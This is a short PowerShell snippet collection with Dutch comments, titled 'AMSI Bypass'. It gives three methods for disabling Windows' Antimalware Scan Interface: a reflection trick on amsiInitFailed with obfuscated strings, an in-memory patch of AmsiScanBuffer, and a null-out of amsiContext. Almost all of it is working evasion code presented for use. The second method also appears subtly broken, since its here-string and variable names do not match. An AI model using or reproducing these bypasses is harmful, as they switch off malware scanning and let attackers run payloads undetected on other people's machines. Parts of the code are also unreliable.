# --- AMSI Bypass ---

# Methode 1: Reflection (amsiInitFailed) — primair, raakt geen native bytes, omzeilt Defender UD2-trap
$r=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils');$f=$r.GetField('amsi'+'Init'+'Failed','NonPublic,Static');$f.SetValue($null,$true)

# Methode 2: Memory patch x64 — fastcall ABI, callee ruimt stack niet op, plain ret volstaat
$Win32=@" using System;using System.Runtime.InteropServices; public class Win32x64{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint np,out uint op);} "@;Add-Type $Win32x64;$l=[Win32x64]::LoadLibrary("amsi.dll");$a=[Win32x64]::GetProcAddress($l,"AmsiScanBuffer");$p=0;[Win32x64]::VirtualProtect($a,[uint32]6,0x40,[ref]$p)|Out-Null;[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0x31,0xC0,0xC3,0x90,0x90,0x90),0,$a,6)
# Patch bytes: xor eax,eax (31 C0) + ret (C3) + nop x3 (90 90 90) = 6 bytes — retourneert S_OK (0)

# Methode 3: amsiContext null pointer via reflection (pre-Win11 betrouwbaar)
$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

